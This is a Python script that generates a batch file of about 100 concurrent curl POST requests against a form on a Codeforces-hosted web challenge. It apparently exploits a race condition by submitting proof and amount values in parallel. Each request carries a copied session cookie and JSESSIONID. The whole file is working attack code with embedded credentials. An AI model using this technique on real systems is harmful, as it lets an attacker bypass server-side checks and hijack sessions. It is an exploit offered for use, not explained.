f = open("script.bat", "w")
s = ""
for i in range(1, 100):
    s += '''curl "http://1d3p.wp.codeforces.com/new" -H "Connection: keep-alive" -H "Cache-Control: max-age=0" -H "Origin: http://1d3p.wp.codeforces.com" -H "Upgrade-Insecure-Requests: 1" -H "DNT: 1" -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36 Avast/76.0.1632.101" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" -H "Referer: http://1d3p.wp.codeforces.com/" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US,en;q=0.9" -H "Cookie: _ym_uid=1542121194218072311; __utmz=71512449.1555362621.178.4.utmcsr=google^|utmccn=(organic)^|utmcmd=organic^|utmctr=(not^%^20provided); _ym_d=1558539202; _ga=GA1.2.192082396.1542121191; _gcl_au=1.1.1651567687.1567627160; __utma=71512449.192082396.1542121191.1568038599.1568364411.258; _gid=GA1.2.785708810.1568364431; __utmc=71512449; evercookie_png=4jiky6yqncra0mxdl9; evercookie_etag=4jiky6yqncra0mxdl9; evercookie_cache=4jiky6yqncra0mxdl9; 70a7c28f3de=4jiky6yqncra0mxdl9; __utmt=1; __utmb=71512449.30.10.1568364411; JSESSIONID=CBD8E1A0BEE61363DC564486161B021B" --data "_af=34be50b38beccce4^&proof='''
    s += str(i * i)
    s += '''^&amount='''
    s += str(i)
    s += '''^&submit=Submit" --compressed --insecure & '''
s += '''curl "http://1d3p.wp.codeforces.com/new" -H "Connection: keep-alive" -H "Cache-Control: max-age=0" -H "Origin: http://1d3p.wp.codeforces.com" -H "Upgrade-Insecure-Requests: 1" -H "DNT: 1" -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36 Avast/76.0.1632.101" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" -H "Referer: http://1d3p.wp.codeforces.com/" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US,en;q=0.9" -H "Cookie: _ym_uid=1542121194218072311; __utmz=71512449.1555362621.178.4.utmcsr=google^|utmccn=(organic)^|utmcmd=organic^|utmctr=(not^%^20provided); _ym_d=1558539202; _ga=GA1.2.192082396.1542121191; _gcl_au=1.1.1651567687.1567627160; __utma=71512449.192082396.1542121191.1568038599.1568364411.258; _gid=GA1.2.785708810.1568364431; __utmc=71512449; evercookie_png=4jiky6yqncra0mxdl9; evercookie_etag=4jiky6yqncra0mxdl9; evercookie_cache=4jiky6yqncra0mxdl9; 70a7c28f3de=4jiky6yqncra0mxdl9; __utmt=1; __utmb=71512449.30.10.1568364411; JSESSIONID=CBD8E1A0BEE61363DC564486161B021B" --data "_af=34be50b38beccce4^&proof='''
s += str(10000)
s += '''^&amount='''
s += str(100)
s += '''^&submit=Submit" --compressed --insecure'''
f.write(s)
f.close()
